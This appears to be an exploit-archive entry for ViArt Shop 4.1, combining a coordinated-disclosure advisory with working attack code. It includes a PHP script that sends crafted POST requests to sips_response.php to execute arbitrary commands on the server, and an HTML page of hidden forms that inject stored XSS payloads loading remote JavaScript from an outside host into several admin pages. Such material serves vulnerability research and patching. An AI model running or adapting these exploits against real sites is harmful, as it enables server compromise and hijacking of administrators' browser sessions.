@@ -1,0 +1,244 @@
+id: 19469
+date: 09/26/2012
+title: ViArt Shop Enterprise 4.1 Arbitrary Command Execution / XSS Vulnerabilities
+author: LiquidWorm
+cves: 
+
+<?php
+
+/*
+
+ViArt Shop Enterprise 4.1 Arbitrary Command Execution Vulnerability
+
+
+Vendor: ViArt Software
+Product web page: http://www.viart.com
+Affected version: 4.1, 4.0.8, 4.0.5
+
+Summary: Viart Shop is a PHP based e-commerce suite, aiming to provide
+everything you need to run a successful on-line business.
+
+Desc: Input passed to the 'DATA' POST parameter in 'sips_response.php'
+is not properly sanitised before being used to process product payment
+data. This can be exploited to execute arbitrary commands via specially
+crafted requests.
+
+Condition: register_globals=On
+
+=======================================================================
+Vuln:
+-----
+/payments/sips_response.php:
+----------------------------
+
+16: if (isset($_POST['DATA'])) {
+17:
+18:     $params  = " message=" . $_POST['DATA'];
+19:     $params .= " pathfile=" .  $payment_params['pathfile'];
+20:     exec($payment_params['path_bin_resp'] . $params, $result);
+
+-----------------------------------------------------------------------
+Fix:
+----
+/payments/sips_response.php:
+----------------------------
+
+5: if (!defined("VA_PRODUCT")) {
+6:     header ("Location: ../index.php");
+7:     exit;
+8: }
+9:
+10: if (isset($_POST['DATA'])) {
+11:
+12:     $params  = " message=" . $_POST['DATA'];
+13:     $params .= " pathfile=" .  $payment_params['pathfile'];
+14:     exec($payment_params['path_bin_resp'] . $params, $result);
+
+=======================================================================
+
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
+           Apache 2.4.2 (Win32)
+           PHP 5.4.4
+           MySQL 5.5.25a
+
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+                            Zero Science Lab - http://www.zeroscience.mk
+
+
+Vendor status:
+
+[09.09.2012] Vulnerability discovered.
+[24.09.2012] Contact with the vendor.
+[24.09.2012] Vendor responds asking more details.
+[24.09.2012] Sent detailed information to the vendor.
+[25.09.2012] Vendor confirms the vulnerability, issuing patch (http://www.viart.com/downloads/sips_response.zip).
+[25.09.2012] Coordinated public security advisory released.
+
+
+Advisory ID: ZSL-2012-5109
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5109.php
+
+Vendor: http://www.viart.com/downloads/viart_shop-4.1.zip
+
+
+09.09.2012
+
+*/
+
+
+error_reporting(0);
+
+print "\n-----------------------------------------------------------";
+print "\n\n ViArt Shop Enterprise 4.1 Remote Command Execution\n\n";
+print "\t\tID: ZSL-2012-5109\n\n";
+print "-----------------------------------------------------------\n";
+
+if ($argc < 2)
+{
+    print "\n\n\x20[*] Usage: php $argv[0] <host> <cmd>\n\n";
+    print "\x20[*] Example: php $argv[0] localhost windows%2Fsystem32%2Fcalc.exe\n\n";
+    die();
+}
+
+$host = $argv[1];
+$cmd = $argv[2];
+$sock = fsockopen($host,80);
+
+$post = "DATA=..%2F..%2F..%2F..%2F..%2F{$cmd}";
+$duz = strlen($post);
+
+$data = "POST http://{$host}/payments/sips_response.php HTTP/1.1\r\n".
+        "Host: {$host}\r\n".
+        "User-Agent: Mozilla/5.0\r\n".
+        "Content-Type: application/x-www-form-urlencoded\r\n".
+        "Accept-Encoding: gzip,deflate\r\n".
+        "Content-Length: {$duz}\r\n\r\n{$post}\r\n\r\n";
+
+fputs($sock,$data);
+while(!feof($sock))
+{
+    $html .= fgets($sock);
+}
+fclose($sock);
+echo "\n" . $html;
+
+?>
+
+<!--
+
+ViArt Shop Enterprise 4.1 (post-auth) Multiple Stored XSS Vulnerabilities
+
+
+Vendor: ViArt Software
+Product web page: http://www.viart.com
+Affected version: 4.1, 4.0.8 and 4.0.5
+
+Summary: Viart Shop is a PHP based e-commerce suite, aiming to provide everything
+you need to run a successful on-line business.
+
+Desc: ViArt Shop suffers from multiple stored cross-site scripting vulnerabilities.
+The issues are triggered when input passed via several parameters to several scripts
+is not properly sanitized before being returned to the user. This can be exploited to
+execute arbitrary HTML and script code in a user's browser session in context of an
+affected site.
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
+           Apache 2.4.2 (Win32)
+           PHP 5.4.4
+           MySQL 5.5.25a
+
+
+Vulnerabilities discovered by Gjoko 'LiquidWorm' Krstic
+                              @zeroscience
+              
+Exploit coded by teppei (iki@zeroscience.mk)
+
+
+Vendor status:
+
+[09.09.2012] Vulnerabilities discovered.
+[24.09.2012] Contact with the vendor.
+[24.09.2012] Vendor responds asking more details.
+[24.09.2012] Sent detailed information to the vendor.
+[25.09.2012] Vendor confirms the issues, releasing fix (http://www.viart.com/downloads/viart_shop-4.1.zip).
+[25.09.2012] Coordinated public security advisory released.
+
+
+Advisory ID: ZSL-2012-5108
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5108.php
+
+
+09.09.2012
+
+-->
+
+<html>
+<head>
+<title>ViArt Shop Enterprise 4.1 (post-auth) Multiple Stored XSS Vulnerabilities</title>
+</head>
+<body><center><br />
+<form method="post" action="http://localhost/viart/admin/admin_item_type.php">
+<input type="hidden" name="affiliate_commission_amount" value="2" />
+<input type="hidden" name="affiliate_commission_type" value="" />
+<input type="hidden" name="credit_reward_amount" value="" />
+<input type="hidden" name="credit_reward_type" value="" />
+<input type="hidden" name="google_base_type_id" value="-1" />
+<input type="hidden" name="item_type_id" value="" />
+<input type="hidden" name="item_type_name" value='"><script src="http://zeroscience.mk/codes/dae.js"></script>' />
+<input type="hidden" name="merchant_fee_amount" value="1" />
+<input type="hidden" name="merchant_fee_type" value="0" />
+<input type="hidden" name="operation" value="save" />
+<input type="hidden" name="reward_amount" value="" />
+<input type="hidden" name="reward_type" value="" />
+<input type="submit" value="Xploit #1" />
+</form>
+<br />
+<form method="post" action="http://localhost/viart/admin/admin_supplier.php">
+<input type="hidden" name="full_description" value="1" />
+<input type="hidden" name="operation" value="save" />
+<input type="hidden" name="short_description" value="ZSL" />
+<input type="hidden" name="supplier_email" value="lab@zeroscience.mk" />
+<input type="hidden" name="supplier_id" value="" />
+<input type="hidden" name="supplier_name" value='"><script src="http://zeroscience.mk/codes/dae.js"></script>' />
+<input type="hidden" name="supplier_order" value="1" />
+<input type="submit" value="Xploit #2" />
+</form>
+<br />
+<form method="post" action="http://localhost/viart/admin/admin_saved_type.php">
+<input type="hidden" name="allowed_search" value="1" />
+<input type="hidden" name="is_active" value="1" />
+<input type="hidden" name="operation" value="save" />
+<input type="hidden" name="type_desc" value="thricer" />
+<input type="hidden" name="type_id" value="" />
+<input type="hidden" name="type_name" value='"><script src="http://zeroscience.mk/codes/dae.js"></script>' />
+<input type="submit" value="Xploit #3" />
+</form>
+<br />
+<form method="post" action="http://localhost/viart/admin/admin_forum_topic.php">
+<input type="hidden" name="attachments_url" value="admin_forum_attachments.php" />
+<input type="hidden" name="description" value="sm" />
+<input type="hidden" name="forum_id" value="1" />
+<input type="hidden" name="friendly_url" value="Ecchi" />
+<input type="hidden" name="operation" value="save" />
+<input type="hidden" name="priority_id" value="1" />
+<input type="hidden" name="remote_address" value='"><script src="http://zeroscience.mk/codes/dae.js"></script>' />
+<input type="hidden" name="rp" value="admin_forum_thread.php?thread_id=" />
+<input type="hidden" name="thread_id" value="" />
+<input type="hidden" name="topic" value='"><script src="http://zeroscience.mk/codes/dae.js"></script>' />
+<input type="hidden" name="user_email" value="iki@zeroscience.mk" />
+<input type="hidden" name="user_id" value="2" />
+<input type="hidden" name="user_name" value="apo" />
+<input type="hidden" name="views" value="2" />
+<input type="submit" value="Xploit #4" />
+</form>
+</center>
+</body>
+</html>
+
+
+
+#  0day.today [2023-03-22]  #
